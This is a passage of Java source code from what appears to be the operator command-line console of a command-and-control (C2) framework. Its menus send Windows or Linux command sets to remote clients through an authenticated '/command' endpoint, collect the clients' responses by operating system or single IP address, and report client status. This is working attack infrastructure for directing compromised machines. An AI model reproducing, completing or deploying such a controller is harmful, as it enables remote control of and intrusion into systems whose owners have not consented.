                            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON(target, windowsCommands), bearerToken, testing, this);
                        } else {
                            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON(target, linuxCommands), bearerToken, testing, this);
                        }
                    }
                }
                
            // Request Menu Data from Clients
            } else if(currentUserPath.equals("Request")){
                printRequest();
                System.out.println("1. Request from ALL " + BLUE + "Windows" + RESET + " Clients");
                System.out.println("2. Request from ALL " + RED + "Linux" + RESET + " Clients");
                System.out.println("3. Request from single IP Address");
                System.out.println("4. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();

                if(userInput.equals("1")){
                    printClientResponses("Windows");
                // Request from all Linux Boxes
                } else if (userInput.equals("2")){
                    printClientResponses("Linux");
                // Request from single IP
                } else if (userInput.equals("3")){
                    // Ask user for IP
                    System.out.print("Enter IP Address for desired request >> ");
                    String IPAddress = userInputScanner.nextLine();
                    if(validateIPv4Address(IPAddress)){
                        printClientResponses(IPAddress);
                    }
                // Return to home menu
                } else if (userInput.equals("4")){
                        currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }

            // Get Client Status Data
            } else if(currentUserPath.equals("Status")){
                String statusRequest = HTTPSRequest.sendRequest(C2URL + "/status", null, bearerToken, testing, this);
                System.out.println(formatClientStatus((new JSONObject(statusRequest).toMap())));
                currentUserPath = "";
            }
        }
    }

    public static void main(String[] args) {
        C2ServerCLI cli = new C2ServerCLI();
        Thread cliThread = new Thread(cli);
        cliThread.start();
    }
}